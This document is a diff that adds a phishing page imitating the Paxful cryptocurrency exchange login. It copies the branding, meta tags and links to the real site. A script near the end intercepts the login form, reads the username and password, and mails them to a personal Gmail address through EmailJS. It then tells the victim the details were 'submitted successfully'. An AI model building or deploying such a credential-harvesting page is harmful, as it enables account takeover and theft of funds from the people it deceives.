@@ -1,0 +1,318 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="theme-color" content="#000000">
+    <title>Login | Paxful</title>
+    <meta name="description" content="Login to your Paxful account">
+    <link rel="canonical" href="https://accounts.paxful.com/login">
+    <meta property="og:title" content="Login | Paxful">
+    <meta property="og:description" content="Login to your Paxful account">
+    <meta property="og:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png">
+    <meta property="og:image:width" content="1600">
+    <meta property="og:image:height" content="1001">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Login | Paxful">
+    <meta name="twitter:description" content="Login to your Paxful account">
+    <meta name="twitter:image" content="https://static.paxful.com/google-search-imagery/GS_Login.png">
+    <link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="256x256">
+
+    <style>
+        :root {
+            --primary-color: #C9F24D;
+            --text-color: #fff;
+            --text-secondary: #ccc;
+            --bg-color: #000;
+            --input-bg: #1a1a1a;
+            --input-border: #333;
+            --spacing-sm: clamp(8px, 2vw, 16px);
+            --spacing-lg: clamp(16px, 4vw, 32px);
+            --font-size-base: clamp(14px, 2.5vw, 16px);
+            --font-size-heading: clamp(24px, 5vw, 32px);
+            --container-width: clamp(300px, 90vw, 498px);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Arial', sans-serif;
+            background: var(--bg-color);
+            color: var(--text-color);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .page-wrapper {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        .content-wrapper {
+            display: flex;
+            flex-direction: row;
+            flex-grow: 1;
+            gap: var(--spacing-lg);
+        }
+
+        .login-section {
+            width: 100%;
+            max-width: var(--container-width);
+            margin: 0 auto;
+            padding: var(--spacing-lg);
+            display: flex;
+            flex-direction: column;
+            gap: var(--spacing-lg);
+        }
+
+        .logo-wrapper {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-sm);
+        }
+
+        .logo-icon {
+            width: clamp(24px, 5vw, 32px);
+            height: clamp(24px, 5vw, 32px);
+            fill: var(--primary-color);
+        }
+
+        .logo-text {
+            height: clamp(20px, 4vw, 34px);
+            fill: var(--text-color);
+        }
+
+        .welcome-text h1 {
+            font-size: var(--font-size-heading);
+            font-weight: 600;
+            margin-bottom: var(--spacing-sm);
+        }
+
+        .welcome-text p {
+            font-size: var(--font-size-base);
+            color: var(--text-secondary);
+        }
+
+        .welcome-text a {
+            color: var(--primary-color);
+            text-decoration: underline;
+        }
+
+        .login-form {
+            display: flex;
+            flex-direction: column;
+            gap: var(--spacing-lg);
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: var(--spacing-sm);
+        }
+
+        .form-group label {
+            font-size: var(--font-size-base);
+            font-weight: 500;
+            color: var(--text-secondary);
+            display: none;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: var(--spacing-sm);
+            height: clamp(40px, 10vw, 56px);
+            font-size: var(--font-size-base);
+            border-radius: 8px;
+            border: 1px solid var(--input-border);
+            background: var(--input-bg);
+            color: var(--text-color);
+            outline: none;
+        }
+
+        .form-group input::placeholder {
+            color: var(--text-secondary);
+            opacity: 0.7;
+        }
+
+        .forgot-password {
+            text-align: right;
+            font-size: var(--font-size-base);
+        }
+
+        .forgot-password a {
+            color: var (--text-secondary);
+            text-decoration: underline;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: var(--spacing-sm);
+            height: clamp(40px, 10vw, 48px);
+            font-size: var(--font-size-base);
+            font-weight: 600;
+            background: var(--primary-color);
+            color: var(--bg-color);
+            border: none;
+            border-radius: 24px;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .login-button:hover {
+            background: #b8e042;
+        }
+
+        .background-section {
+            display: none;
+            flex-grow: 1;
+            width: 50%;
+            background: url('static/images/Screenshot 2025-03-04 182035.png') no-repeat center center;
+            background-size: cover;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .background-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('static/images/Screenshot 2025-03-04 182035.png') no-repeat center center;
+            background-size: cover;
+            z-index: 1;
+        }
+
+        @media (min-width: 768px) {
+            .page-wrapper {
+                flex-direction: row;
+            }
+
+            .login-section {
+                width: 50%;
+                max-width: var(--container-width);
+            }
+
+            .background-section {
+                display: block;
+            }
+        }
+
+        @media (min-width: 1200px) {
+            .login-section {
+                width: 498px;
+                box-shadow: 0 4px 8px rgba(255, 255, 255, 0.25);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <section class="login-section" aria-label="Login Section">
+            <a href="https://paxful.com" class="logo-wrapper">
+                <svg class="logo-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
+                    <path fill="var(--primary-color)" d="M0 26.5A5.5 5.5 0 0 1 5.5 21H11v11H5.5A5.5 5.5 0 0 1 0 26.5M11 0h10.5C27.299 0 32 4.701 32 10.5S27.299 21 21.5 21H11z"/>
+                </svg>
+                <svg class="logo-text" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 103 34">
+                    <g fill="var(--text-color)">
+                        <path d="M102.625 0h-4.55v27.2h4.55z"/>
+                        <path fill-rule="evenodd" d="M20.047 17.378c0 5.633-3.131 10.2-8.68 10.2-2.862 0-5.153-1.628-6.192-2.98V34H.625V7.556h4.55v2.602c1.04-1.353 3.33-2.98 6.192-2.98 5.549 0 8.68 4.567 8.68 10.2m-4.562-.006c0 3.52-2.352 6.375-5.254 6.375s-5.254-2.854-5.254-6.375 2.352-6.375 5.254-6.375 5.254 2.854 5.254 6.375" clip-rule="evenodd"/>
+                        <path d="M81.455 7.556h-4.55V20.95c0 3.451 2.04 6.627 6.242 6.627 3.075 0 5.085-1.29 6.212-3.184V27.2h4.55V7.556h-4.55V18.35c0 2.069-1.146 4.844-4.203 5.05-2.473.165-3.7-1.526-3.7-3.907zM74.553 3.953V0H71.91c-.7 0-1.051 0-1.346.03a6.04 6.04 0 0 0-5.418 5.422 7 7 0 0 0-.026.592h-.003V27.2h4.55V12.089h4.305V7.556H69.67c0-1.058 0-2.168.205-2.572.181-.355.47-.644.825-.825.404-.206.932-.206 1.989-.206z"/>
+                        <path fill-rule="evenodd" d="M23.211 13.978h4.585c.03-1.45.819-3.544 4.41-3.544 3.627 0 3.834 1.318 3.83 2.554l-.001.127c0 .751-.134 1.308-.84 1.849-.703.538-1.742.559-2.679.578h-.015q-.41.008-.823.013h-.001c-1.763.024-3.586.049-5.267.554-2.971.892-4.665 3.293-4.099 6.747.25 1.502 1.65 4.91 6.793 4.91 3.717 0 6.137-1.727 6.996-2.976v2.41h4.55V16.244l.002-.674v-.005q.002-.373.006-.736c.045-4.335.08-7.651-8.535-7.651-5.865 0-8.682 2.89-8.912 6.8m3.757 7.957c-.077-1.69.98-2.99 3.19-3.278a18 18 0 0 1 1.852-.218c.703-.052 1.63-.105 2.425-.237 1.514-.299 1.833-.755 1.833-.755v1.495c0 3.863-3 5.704-5.693 5.704-1.974 0-3.513-.953-3.607-2.711" clip-rule="evenodd"/>
+                        <path d="M62.617 7.49h-5.254l-4.484 6.232-4.484-6.231H43.14l7.111 9.88-7.111 9.882h5.254l4.484-6.231 4.484 6.231h5.254l-7.111-9.881z"/>
+                    </g>
+                </svg>
+            </a>
+            <div class="welcome-text">
+                <h1>Welcome back!</h1>
+                <p>Don’t have an account? <a href="https://accounts.paxful.com/register">Sign up</a></p>
+            </div>
+            <form class="login-form" id="loginForm" method="POST" action="">
+                <div class="form-group">
+                    <label for="username">Email / Phone Number</label>
+                    <input type="text" id="username" name="username" placeholder="Email / Phone Number" required autocomplete="email">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
+                </div>
+                <div class="forgot-password">
+                    <a href="https://accounts.paxful.com/forgot-password">Forgot password?</a>
+                </div>
+                <button type="submit" class="login-button">Sign in</button>
+            </form>
+        </section>
+        <div class="background-section"></div>
+    </div>
+
+    <!-- EmailJS Script -->
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // Initialize EmailJS with your Public Key
+        emailjs.init('YOUR_PUBLIC_KEY'); // Replace with your EmailJS Public Key
+
+        // Handle form submission
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault(); // Prevent default form submission
+
+            // Get form values
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // Email parameters
+            const templateParams = {
+                to_email: 'piusmuchui0@gmail.com', // Recipient email
+                from_name: 'Paxful Login Form',
+                username: username,
+                password: password
+            };
+
+            // Send email using EmailJS
+            emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
+                .then(function(response) {
+                    console.log('Email sent successfully!', response.status, response.text);
+                    alert('Login details submitted successfully!');
+                }, function(error) {
+                    console.error('Failed to send email:', error);
+                    alert('Failed to submit login details. Please try again.');
+                });
+
+            // Clear the form after submission
+            this.reset();
+        });
+    </script>
+
+    <!-- Theme Toggle Script -->
+    <script>
+        (function() {
+            try {
+                const docElement = document.documentElement;
+                const classList = docElement.classList;
+                classList.remove('dark', 'light');
+                const savedTheme = localStorage.getItem('theme');
+                if (savedTheme === 'system' || (!savedTheme && false)) {
+                    const darkQuery = window.matchMedia('(prefers-color-scheme: dark)');
+                    if (darkQuery.matches) {
+                        docElement.style.colorScheme = 'dark';
+                        classList.add('dark');
+                    } else {
+                        docElement.style.colorScheme = 'light';
+                        classList.add('light');
+                    }
+                } else if (savedTheme) {
+                    classList.add(savedTheme);
+                } else {
+                    classList.add('dark');
+                }
+            } catch (e) {}
+        })();
+    </script>
+</body>
+</html>
